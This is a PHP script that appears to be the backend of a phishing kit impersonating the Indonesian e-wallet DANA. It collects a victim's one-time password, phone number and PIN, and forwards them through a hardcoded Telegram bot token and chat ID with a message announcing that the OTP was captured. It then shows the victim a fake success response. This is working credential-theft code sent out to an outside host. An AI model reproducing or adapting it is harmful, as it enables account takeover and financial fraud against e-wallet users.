<?php
session_start();
header('Content-Type: application/json');

$otp_full = $_POST['otp_full'] ?? ($_POST['otp1'].$_POST['otp2'].$_POST['otp3'].$_POST['otp4']);
$phone = $_POST['phone'] ?? ($_SESSION['phoneNumber'] ?? '-');
$user_pin = $_SESSION['user_pin'] ?? '-';

// KIRIM TELEGRAM
$botToken = "8779308804:AAHdW8BQWRCker7A5Exma6hIqgneT0cMCek";
$chatId   = "7864293365";
$message  = "🔔 *DANA | VERIFIKASI OTP*\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "📱 *Nomor HP:* `$phone`\n";
$message .= "🔢 *OTP:* `$otp_full`\n";
$message .= "🔑 *PIN:* `$user_pin`\n";
$message .= "📍 *Status:* OTP Berhasil Ditangkap ✅\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($message)."&parse_mode=Markdown";
file_get_contents($url);

echo json_encode(['status' => 'success', 'redirect' => 'success.html']);
?>
